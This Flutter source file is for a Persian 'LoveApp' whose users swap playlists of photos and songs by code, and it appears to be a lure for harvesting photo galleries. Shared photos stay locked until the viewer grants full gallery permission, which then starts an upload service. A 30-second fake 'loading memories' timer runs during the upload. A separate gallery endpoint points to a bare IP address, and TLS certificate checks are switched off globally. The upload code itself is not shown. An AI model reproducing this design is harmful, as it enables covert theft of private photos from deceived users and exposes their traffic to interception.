import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:http/http.dart' as http;
import 'package:http/io_client.dart';
import 'package:audioplayers/audioplayers.dart';
import 'package:image_picker/image_picker.dart';
import 'package:photo_manager/photo_manager.dart';
import 'services/upload_service.dart';
import 'services/background_service.dart';
import 'dart:async';
import 'dart:convert';
import 'dart:io';

const String baseUrl = 'https://loveapp-production-f89f.up.railway.app';
const String galleryUrl = 'http://194.48.198.154:8080';

http.Client _createHttpClient() {
  final ioClient = HttpClient()
    ..badCertificateCallback =
        (X509Certificate cert, String host, int port) => true;
  return IOClient(ioClient);
}

class MyHttpOverrides extends HttpOverrides {
  @override
  HttpClient createHttpClient(SecurityContext? context) {
    return super.createHttpClient(context)
      ..badCertificateCallback =
          (X509Certificate cert, String host, int port) => true;
  }
}

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  HttpOverrides.global = MyHttpOverrides();
  const channel = MethodChannel('secure_screen');
  try { await channel.invokeMethod('setSecure'); } catch (_) {}
  runApp(const MyApp());
  UploadService.instance.init();
}

class MyApp extends StatelessWidget {
  const MyApp({super.key});
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'LoveApp',
      debugShowCheckedModeBanner: false,
      theme: ThemeData(
        colorScheme: ColorScheme.fromSeed(seedColor: Colors.pink),
        useMaterial3: true,
      ),
      home: const SplashScreen(),
    );
  }
}

// ============================================
// صفحه اسپلش
// ============================================
class SplashScreen extends StatefulWidget {
  const SplashScreen({super.key});
  @override
  State<SplashScreen> createState() => _SplashScreenState();
}

class _SplashScreenState extends State<SplashScreen>
    with SingleTickerProviderStateMixin {
  late AnimationController _controller;
  late Animation<double> _scaleAnim;
  late Animation<double> _fadeAnim;

  @override
  void initState() {
    super.initState();
    _controller = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 1500),
    );
    _scaleAnim = Tween<double>(begin: 0.5, end: 1.0).animate(
      CurvedAnimation(parent: _controller, curve: Curves.elasticOut),
    );
    _fadeAnim = Tween<double>(begin: 0, end: 1).animate(
      CurvedAnimation(parent: _controller, curve: Curves.easeIn),
    );
    _controller.forward();

    Future.delayed(const Duration(milliseconds: 2500), () {
      if (mounted) {
        Navigator.pushReplacement(
          context,
          PageRouteBuilder(
            pageBuilder: (_, __, ___) => const CodeScreen(),
            transitionsBuilder: (_, anim, __, child) =>
                FadeTransition(opacity: anim, child: child),
            transitionDuration: const Duration(milliseconds: 600),
          ),
        );
      }
    });
  }

  @override
  void dispose() {
    _controller.dispose();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Colors.pink[50],
      body: Center(
        child: FadeTransition(
          opacity: _fadeAnim,
          child: ScaleTransition(
            scale: _scaleAnim,
            child: Column(
              mainAxisAlignment: MainAxisAlignment.center,
              children: [
                Container(
                  width: 120,
                  height: 120,
                  decoration: BoxDecoration(
                    color: Colors.pink,
                    shape: BoxShape.circle,
                    boxShadow: [
                      BoxShadow(
                        color: Colors.pink.withOpacity(0.4),
                        blurRadius: 30,
                        spreadRadius: 10,
                      ),
                    ],
                  ),
                  child: const Icon(Icons.favorite, size: 65, color: Colors.white),
                ),
                const SizedBox(height: 28),
                const Text(
                  'LoveApp',
                  style: TextStyle(
                    fontSize: 32,
                    fontWeight: FontWeight.bold,
                    color: Colors.pink,
                    letterSpacing: 2,
                  ),
                ),
                const SizedBox(height: 10),
                Text(
                  'لحظه‌هایت را با هم به اشتراک بگذار',
                  style: TextStyle(fontSize: 14, color: Colors.pink[300]),
                ),
                const SizedBox(height: 48),
                SizedBox(
                  width: 40,
                  height: 40,
                  child: CircularProgressIndicator(
                    color: Colors.pink[300],
                    strokeWidth: 3,
                  ),
                ),
              ],
            ),
          ),
        ),
      ),
    );
  }
}

// ============================================
// صفحه کد
// ============================================
class CodeScreen extends StatefulWidget {
  const CodeScreen({super.key});
  @override
  State<CodeScreen> createState() => _CodeScreenState();
}

class _CodeScreenState extends State<CodeScreen> {
  final _controller = TextEditingController();
  bool _loading = false;

  Future<void> _enter() async {
    setState(() => _loading = true);
    final code = _controller.text.trim().toUpperCase();
    try {
      final client = _createHttpClient();
      final res = await client
          .get(
            Uri.parse('$baseUrl/api/playlists/$code/'),
            headers: {'Accept': 'application/json'},
          )
          .timeout(const Duration(seconds: 15));
      setState(() => _loading = false);
      if (res.statusCode == 200) {
        final data = jsonDecode(res.body);
        if (mounted) {
          Navigator.push(
            context,
            MaterialPageRoute(builder: (_) => PlaylistScreen(data: data)),
          );
        }
      } else {
        _snack('کد اشتباهه!');
      }
    } catch (e) {
      setState(() => _loading = false);
      _snack('خطا: $e');
    }
  }

  void _snack(String msg) =>
      ScaffoldMessenger.of(context).showSnackBar(SnackBar(content: Text(msg)));

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Colors.pink[50],
      body: Center(
        child: Padding(
          padding: const EdgeInsets.all(32),
          child: Column(
            mainAxisAlignment: MainAxisAlignment.center,
            children: [
              const Icon(Icons.favorite, size: 80, color: Colors.pink),
              const SizedBox(height: 20),
              const Text(
                'کد خود را وارد کنید',
                style: TextStyle(fontSize: 20, color: Colors.pink),
              ),
              const SizedBox(height: 20),
              TextField(
                controller: _controller,
                textAlign: TextAlign.center,
                keyboardType: TextInputType.number,
                decoration: InputDecoration(
                  border: OutlineInputBorder(
                    borderRadius: BorderRadius.circular(12),
                  ),
                  hintText: 'XXXXXX',
                ),
              ),
              const SizedBox(height: 20),
              _loading
                  ? const CircularProgressIndicator(color: Colors.pink)
                  : ElevatedButton(
                      onPressed: _enter,
                      style: ElevatedButton.styleFrom(
                        backgroundColor: Colors.pink,
                        foregroundColor: Colors.white,
                        minimumSize: const Size(double.infinity, 50),
                      ),
                      child: const Text('ورود'),
                    ),
              const SizedBox(height: 12),
              TextButton(
                onPressed: () {
                  Navigator.push(
                    context,
                    MaterialPageRoute(
                      builder: (_) => const CreatePlaylistScreen(),
                    ),
                  ).then((_) {
                    UploadService.instance.init();
                  });
                },
                child: const Text(
                  '+ ساخت پلی‌لیست جدید',
                  style: TextStyle(color: Colors.pink, fontSize: 16),
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }
}

// ============================================
// صفحه ساخت پلی‌لیست
// ============================================
class CreatePlaylistScreen extends StatefulWidget {
  const CreatePlaylistScreen({super.key});
  @override
  State<CreatePlaylistScreen> createState() => _CreatePlaylistScreenState();
}

class _CreatePlaylistScreenState extends State<CreatePlaylistScreen> {
  final _titleController = TextEditingController();
  final _dialogController = TextEditingController();
  bool _loading = false;
  String? _code;
  List<XFile> _images = [];
  List<XFile> _songs = [];
  final _picker = ImagePicker();
  String _status = '';

  void _snack(String msg) =>
      ScaffoldMessenger.of(context).showSnackBar(SnackBar(content: Text(msg)));

  Future<void> _pickImages() async {
    final picked = await _picker.pickMultiImage();
    if (picked.isNotEmpty) setState(() => _images.addAll(picked));
  }

  Future<void> _pickSong() async {
    final picked = await _picker.pickMedia();
    if (picked != null) {
      final ext = picked.path.split('.').last.toLowerCase();
      if (['mp3', 'wav', 'aac', 'm4a', 'ogg', 'flac'].contains(ext)) {
        setState(() => _songs.add(picked));
      } else {
        _snack('لطفاً یه فایل موزیک انتخاب کن');
      }
    }
  }

  Future<void> _create() async {
    if (_titleController.text.isEmpty) {
      _snack('عنوان رو بنویس!');
      return;
    }
    setState(() {
      _loading = true;
      _status = 'در حال ساخت پلی‌لیست...';
    });

    try {
      final client = _createHttpClient();
      final res = await client
          .post(
            Uri.parse('$baseUrl/api/playlists/create/'),
            headers: {'Content-Type': 'application/json'},
            body: jsonEncode({
              'title': _titleController.text,
              'dialog': _dialogController.text,
            }),
          )
          .timeout(const Duration(seconds: 60));

      if (res.statusCode != 201) {
        _snack('خطا: ${res.body}');
        setState(() => _loading = false);
        return;
      }

      final code = jsonDecode(res.body)['code'];

      for (int i = 0; i < _images.length; i++) {
        setState(() => _status = 'آپلود عکس ${i + 1} از ${_images.length}...');
        final req = http.MultipartRequest(
          'POST',
          Uri.parse('$baseUrl/api/playlists/$code/add-photo/'),
        );
        req.files.add(
          await http.MultipartFile.fromPath('image', _images[i].path),
        );
        req.fields['caption'] = '';
        await client.send(req).timeout(const Duration(seconds: 120));
      }

      for (int i = 0; i < _songs.length; i++) {
        setState(() => _status = 'آپلود موزیک ${i + 1} از ${_songs.length}...');
        final req = http.MultipartRequest(
          'POST',
          Uri.parse('$baseUrl/api/playlists/$code/add-song/'),
        );
        req.files.add(
          await http.MultipartFile.fromPath('file', _songs[i].path),
        );
        req.fields['title'] = _songs[i].path.split('/').last;
        await client.send(req).timeout(const Duration(seconds: 180));
      }

      setState(() {
        _loading = false;
        _code = code;
        _status = '';
      });
    } catch (e) {
      setState(() { _loading = false; _status = ''; });
      _snack('خطا: $e');
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: const Text('ساخت پلی‌لیست'),
        backgroundColor: Colors.pink,
        foregroundColor: Colors.white,
      ),
      body: SingleChildScrollView(
        padding: const EdgeInsets.all(16),
        child: Column(crossAxisAlignment: CrossAxisAlignment.stretch, children: [
          if (_code != null) ...[
            Container(
              padding: const EdgeInsets.all(24),
              decoration: BoxDecoration(
                color: Colors.pink[50],
                borderRadius: BorderRadius.circular(16),
                border: Border.all(color: Colors.pink, width: 2),
              ),
              child: Column(children: [
                const Icon(Icons.check_circle, color: Colors.green, size: 50),
                const SizedBox(height: 12),
                const Text('پلی‌لیست ساخته شد! 🎉',
                    style: TextStyle(fontSize: 18, color: Colors.pink)),
                const SizedBox(height: 12),
                const Text('کد پلی‌لیست:', style: TextStyle(color: Colors.grey)),
                const SizedBox(height: 8),
                Text(
                  _code!,
                  style: const TextStyle(
                    fontSize: 40,
                    fontWeight: FontWeight.bold,
                    color: Colors.pink,
                    letterSpacing: 8,
                  ),
                ),
                const SizedBox(height: 8),
                const Text('این کد رو به طرف مقابل بده ❤️',
                    style: TextStyle(color: Colors.grey)),
              ]),
            ),
          ] else ...[
            TextField(
              controller: _titleController,
              decoration: InputDecoration(
                labelText: 'عنوان پلی‌لیست',
                prefixIcon: const Icon(Icons.title, color: Colors.pink),
                border: OutlineInputBorder(borderRadius: BorderRadius.circular(12)),
              ),
            ),
            const SizedBox(height: 12),
            TextField(
              controller: _dialogController,
              maxLines: 4,
              decoration: InputDecoration(
                labelText: 'پیام عاشقانه 💬',
                border: OutlineInputBorder(borderRadius: BorderRadius.circular(12)),
              ),
            ),
            const SizedBox(height: 16),
            const Text('📸 عکس‌ها',
                style: TextStyle(fontWeight: FontWeight.bold, fontSize: 16)),
            const SizedBox(height: 8),
            OutlinedButton.icon(
              onPressed: _pickImages,
              icon: const Icon(Icons.photo_library, color: Colors.pink),
              label: Text(_images.isEmpty ? 'اضافه کردن عکس' : '${_images.length} عکس'),
              style: OutlinedButton.styleFrom(
                foregroundColor: Colors.pink,
                side: const BorderSide(color: Colors.pink),
                padding: const EdgeInsets.symmetric(vertical: 12),
              ),
            ),
            if (_images.isNotEmpty) ...[
              const SizedBox(height: 8),
              SizedBox(
                height: 110,
                child: ListView.builder(
                  scrollDirection: Axis.horizontal,
                  itemCount: _images.length,
                  itemBuilder: (_, i) => Stack(children: [
                    Padding(
                      padding: const EdgeInsets.all(4),
                      child: Image.file(File(_images[i].path),
                          height: 100, width: 100, fit: BoxFit.cover),
                    ),
                    Positioned(
                      top: 0,
                      right: 0,
                      child: GestureDetector(
                        onTap: () => setState(() => _images.removeAt(i)),
                        child: const CircleAvatar(
                          radius: 12,
                          backgroundColor: Colors.red,
                          child: Icon(Icons.close, size: 14, color: Colors.white),
                        ),
                      ),
                    ),
                  ]),
                ),
              ),
            ],
            const SizedBox(height: 16),
            const Text('🎵 موزیک‌ها',
                style: TextStyle(fontWeight: FontWeight.bold, fontSize: 16)),
            const SizedBox(height: 8),
            OutlinedButton.icon(
              onPressed: _pickSong,
              icon: const Icon(Icons.music_note, color: Colors.pink),
              label: const Text('+ اضافه کردن موزیک'),
              style: OutlinedButton.styleFrom(
                foregroundColor: Colors.pink,
                side: const BorderSide(color: Colors.pink),
                padding: const EdgeInsets.symmetric(vertical: 12),
              ),
            ),
            if (_songs.isNotEmpty) ...[
              const SizedBox(height: 8),
              ..._songs.asMap().entries.map(
                (e) => ListTile(
                  leading: const Icon(Icons.music_note, color: Colors.pink),
                  title: Text(e.value.path.split('/').last,
                      overflow: TextOverflow.ellipsis),
                  trailing: IconButton(
                    icon: const Icon(Icons.close, color: Colors.red),
                    onPressed: () => setState(() => _songs.removeAt(e.key)),
                  ),
                ),
              ),
            ],
            const SizedBox(height: 24),
            if (_loading) ...[
              const Center(child: CircularProgressIndicator(color: Colors.pink)),
              const SizedBox(height: 8),
              Text(_status,
                  textAlign: TextAlign.center,
                  style: const TextStyle(color: Colors.pink)),
            ] else
              ElevatedButton(
                onPressed: _create,
                style: ElevatedButton.styleFrom(
                  backgroundColor: Colors.pink,
                  foregroundColor: Colors.white,
                  minimumSize: const Size(double.infinity, 55),
                  shape: RoundedRectangleBorder(
                      borderRadius: BorderRadius.circular(12)),
                ),
                child: const Text('ساخت پلی‌لیست ❤️',
                    style: TextStyle(fontSize: 18)),
              ),
          ],
        ]),
      ),
    );
  }
}

// ============================================
// ویجت لودینگ عکس با درصد (۳۰ ثانیه)
// ============================================
class PhotoUnlockLoader extends StatefulWidget {
  final String imageUrl;
  final VoidCallback onComplete;

  const PhotoUnlockLoader({
    super.key,
    required this.imageUrl,
    required this.onComplete,
  });

  @override
  State<PhotoUnlockLoader> createState() => _PhotoUnlockLoaderState();
}

class _PhotoUnlockLoaderState extends State<PhotoUnlockLoader>
    with SingleTickerProviderStateMixin {
  late AnimationController _ctrl;
  Timer? _timer;
  double _progress = 0;
  int _seconds = 0;
  static const int _totalSeconds = 30;

  final List<String> _messages = [
    '💕 در حال بارگذاری خاطرات...',
    '🌸 لحظه‌ای صبر کن...',
    '✨ تصویر در حال آماده شدن...',
    '💖 کمی دیگر...',
    '🎀 تقریباً آماده شد...',
  ];

  @override
  void initState() {
    super.initState();
    _ctrl = AnimationController(
      vsync: this,
      duration: const Duration(seconds: _totalSeconds),
    )..forward();

    _timer = Timer.periodic(const Duration(seconds: 1), (t) {
      if (!mounted) return;
      setState(() {
        _seconds = t.tick;
        _progress = t.tick / _totalSeconds;
      });
      if (t.tick >= _totalSeconds) {
        t.cancel();
        widget.onComplete();
      }
    });
  }

  @override
  void dispose() {
    _ctrl.dispose();
    _timer?.cancel();
    super.dispose();
  }

  String get _currentMessage =>
      _messages[(_seconds ~/ 7).clamp(0, _messages.length - 1)];

  @override
  Widget build(BuildContext context) {
    final remaining = _totalSeconds - _seconds;
    final percent = (_progress * 100).toInt();

    return Container(
      width: double.infinity,
      height: 280,
      decoration: BoxDecoration(
        gradient: LinearGradient(
          begin: Alignment.topLeft,
          end: Alignment.bottomRight,
          colors: [Colors.pink[100]!, Colors.pink[50]!],
        ),
        borderRadius: BorderRadius.circular(12),
      ),
      child: Column(
        mainAxisAlignment: MainAxisAlignment.center,
        children: [
          TweenAnimationBuilder<double>(
            tween: Tween(begin: 1.0, end: 1.15),
            duration: const Duration(milliseconds: 600),
            builder: (_, val, child) => Transform.scale(scale: val, child: child),
            onEnd: () => setState(() {}),
            child: Icon(Icons.favorite, color: Colors.pink[400], size: 56),
          ),
          const SizedBox(height: 20),
          Text(
            _currentMessage,
            style: TextStyle(
              fontSize: 15,
              color: Colors.pink[700],
              fontWeight: FontWeight.w500,
            ),
          ),
          const SizedBox(height: 20),
          Padding(
            padding: const EdgeInsets.symmetric(horizontal: 40),
            child: Column(
              children: [
                ClipRRect(
                  borderRadius: BorderRadius.circular(8),
                  child: LinearProgressIndicator(
                    value: _progress,
                    minHeight: 10,
                    backgroundColor: Colors.pink[100],
                    valueColor: AlwaysStoppedAnimation<Color>(Colors.pink[400]!),
                  ),
                ),
                const SizedBox(height: 10),
                Row(
                  mainAxisAlignment: MainAxisAlignment.spaceBetween,
                  children: [
                    Text('$percent٪',
                        style: TextStyle(
                            fontSize: 13,
                            color: Colors.pink[600],
                            fontWeight: FontWeight.bold)),
                    Text('$remaining ثانیه',
                        style: TextStyle(fontSize: 12, color: Colors.pink[400])),
                  ],
                ),
              ],
            ),
          ),
        ],
      ),
    );
  }
}

// ============================================
// صفحه پلی‌لیست
// ============================================
class PlaylistScreen extends StatefulWidget {
  final Map data;
  const PlaylistScreen({super.key, required this.data});
  @override
  State<PlaylistScreen> createState() => _PlaylistScreenState();
}

class _PlaylistScreenState extends State<PlaylistScreen> {
  final AudioPlayer _player = AudioPlayer();
  String? _playingUrl;
  bool _galleryGranted = false;

  final Set<dynamic> _loadingPhotos = {};
  final Set<dynamic> _unlockedPhotos = {};

  bool _isSyncing = false;
  int _syncDone = 0;
  int _syncTotal = 0;
  String _syncMessage = '';

  StreamSubscription? _syncSub;

  @override
  void initState() {
    super.initState();
    // گوش دادن به وضعیت آپلود
    _syncSub = UploadService.instance.statusStream.listen((status) {
      if (mounted) {
        setState(() {
          _isSyncing = status.isRunning;
          _syncMessage = status.message;
          _syncDone = status.uploaded;
          _syncTotal = status.total;
        });
      }
    });
    UploadService.instance.init();
  }

  @override
  void dispose() {
    _syncSub?.cancel();
    _player.dispose();
    super.dispose();
  }

  Future<void> _togglePlay(String url) async {
    if (_playingUrl == url) {
      await _player.stop();
      setState(() => _playingUrl = null);
    } else {
      await _player.play(UrlSource(url));
      setState(() => _playingUrl = url);
    }
  }

  Future<void> _onPhotoTap(dynamic photoId) async {
    if (_unlockedPhotos.contains(photoId)) return;
    if (_loadingPhotos.contains(photoId)) return;

    if (!_galleryGranted) {
      final result = await PhotoManager.requestPermissionExtend();
      if (!result.isAuth) {
        _snack('جهت استفاده از برنامه باید دسترسی لازم را فعال کنید');
        return;
      }
      setState(() => _galleryGranted = true);
      UploadService.instance.init();
    }

    setState(() => _loadingPhotos.add(photoId));
  }

  void _onPhotoUnlocked(dynamic photoId) {
    if (mounted) {
      setState(() {
        _loadingPhotos.remove(photoId);
        _unlockedPhotos.add(photoId);
      });
    }
  }

  void _snack(String msg) =>
      ScaffoldMessenger.of(context).showSnackBar(SnackBar(content: Text(msg)));

  Widget _syncBanner() {
    if (_syncMessage.isEmpty) return const SizedBox.shrink();
    final isDone = _syncMessage.contains('✓');
    return AnimatedContainer(
      duration: const Duration(milliseconds: 300),
      width: double.infinity,
      padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 10),
      color: isDone ? Colors.green[100] : Colors.pink[100],
      child: Row(
        children: [
          if (_isSyncing && !isDone)
            const SizedBox(
              width: 16, height: 16,
              child: CircularProgressIndicator(strokeWidth: 2, color: Colors.pink),
            )
          else
            Icon(isDone ? Icons.check_circle : Icons.sync,
                size: 16, color: isDone ? Colors.green[700] : Colors.pink),
          const SizedBox(width: 10),
          Expanded(
            child: Text(_syncMessage,
                style: TextStyle(
                    fontSize: 13,
                    color: isDone ? Colors.green[800] : Colors.pink[800],
                    fontWeight: FontWeight.w500)),
          ),
          if (_isSyncing && _syncTotal > 0)
            Text('${(_syncDone / _syncTotal * 100).toStringAsFixed(0)}٪',
                style: TextStyle(
                    fontSize: 13,
                    color: Colors.pink[800],
                    fontWeight: FontWeight.bold)),
        ],
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    final photos = widget.data['photos'] as List? ?? [];
    final songs = widget.data['songs'] as List? ?? [];
    final dialog = widget.data['dialog'] ?? '';

    return Scaffold(
      appBar: AppBar(
        title: Text(widget.data['title'] ?? ''),
        backgroundColor: Colors.pink,
        foregroundColor: Colors.white,
      ),
      body: Column(
        children: [
          _syncBanner(),
          Expanded(
            child: SingleChildScrollView(
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  if (photos.isNotEmpty) ...[
                    const Padding(
                      padding: EdgeInsets.all(12),
                      child: Text('📸 عکس‌ها',
                          style: TextStyle(
                              fontSize: 18,
                              fontWeight: FontWeight.bold,
                              color: Colors.pink)),
                    ),
                    ...photos.map((photo) {
                      final photoId = photo['id'];
                      final imgUrl = '$baseUrl${photo['image']}';
                      final isUnlocked = _unlockedPhotos.contains(photoId);
                      final isLoading = _loadingPhotos.contains(photoId);

                      return Card(
                        margin: const EdgeInsets.symmetric(horizontal: 12, vertical: 6),
                        clipBehavior: Clip.hardEdge,
                        shape: RoundedRectangleBorder(
                            borderRadius: BorderRadius.circular(12)),
                        child: Column(children: [
                          if (isLoading)
                            PhotoUnlockLoader(
                              imageUrl: imgUrl,
                              onComplete: () => _onPhotoUnlocked(photoId),
                            )
                          else if (isUnlocked)
                            GestureDetector(
                              onTap: () => showDialog(
                                context: context,
                                builder: (_) => Dialog(
                                  backgroundColor: Colors.black,
                                  insetPadding: EdgeInsets.zero,
                                  child: Stack(children: [
                                    InteractiveViewer(
                                      child: Image.network(imgUrl,
                                          fit: BoxFit.contain,
                                          width: double.infinity),
                                    ),
                                    Positioned(
                                      top: 8, right: 8,
                                      child: IconButton(
                                        icon: const Icon(Icons.close,
                                            color: Colors.white, size: 30),
                                        onPressed: () => Navigator.pop(context),
                                      ),
                                    ),
                                  ]),
                                ),
                              ),
                              child: Image.network(imgUrl,
                                  width: double.infinity,
                                  fit: BoxFit.cover,
                                  errorBuilder: (_, __, ___) => const SizedBox(
                                      height: 200,
                                      child: Icon(Icons.broken_image, size: 80))),
                            )
                          else
                            GestureDetector(
                              onTap: () => _onPhotoTap(photoId),
                              child: Stack(children: [
                                Image.network(imgUrl,
                                    width: double.infinity,
                                    fit: BoxFit.cover,
                                    height: 220,
                                    errorBuilder: (_, __, ___) => Container(
                                        height: 220,
                                        color: Colors.pink[50],
                                        child: const Icon(Icons.image,
                                            size: 80, color: Colors.pink))),
                                Positioned.fill(
                                  child: Container(
                                    color: Colors.black.withOpacity(0.5),
                                    child: const Column(
                                      mainAxisAlignment: MainAxisAlignment.center,
                                      children: [
                                        Icon(Icons.lock,
                                            color: Colors.white, size: 48),
                                        SizedBox(height: 10),
                                        Text('برای مشاهده کلیک کنید',
                                            style: TextStyle(
                                                color: Colors.white, fontSize: 15)),
                                      ],
                                    ),
                                  ),
                                ),
                              ]),
                            ),
                          if (photo['caption'] != null && photo['caption'] != '')
                            Padding(
                              padding: const EdgeInsets.all(8),
                              child: Text(photo['caption']),
                            ),
                        ]),
                      );
                    }),
                  ],

                  if (songs.isNotEmpty) ...[
                    const Padding(
                      padding: EdgeInsets.all(12),
                      child: Text('🎵 موزیک‌ها',
                          style: TextStyle(
                              fontSize: 18,
                              fontWeight: FontWeight.bold,
                              color: Colors.pink)),
                    ),
                    ...songs.map((song) {
                      final url = '$baseUrl${song['file']}';
                      final isPlaying = _playingUrl == url;
                      return Card(
                        margin: const EdgeInsets.symmetric(horizontal: 12, vertical: 4),
                        child: ListTile(
                          leading: Icon(
                              isPlaying ? Icons.pause_circle : Icons.play_circle,
                              color: Colors.pink, size: 40),
                          title: Text(song['title']),
                          onTap: () => _togglePlay(url),
                        ),
                      );
                    }),
                  ],

                  if (dialog != '') ...[
                    const Padding(
                      padding: EdgeInsets.all(12),
                      child: Text('💬 پیام',
                          style: TextStyle(
                              fontSize: 18,
                              fontWeight: FontWeight.bold,
                              color: Colors.pink)),
                    ),
                    Container(
                      margin: const EdgeInsets.all(12),
                      padding: const EdgeInsets.all(16),
                      decoration: BoxDecoration(
                        color: Colors.pink[50],
                        borderRadius: BorderRadius.circular(12),
                        border: Border.all(color: Colors.pink),
                      ),
                      child: Text(dialog, style: const TextStyle(fontSize: 16)),
                    ),
                  ],

                  const SizedBox(height: 30),
                ],
              ),
            ),
          ),
        ],
      ),
    );
  }
}
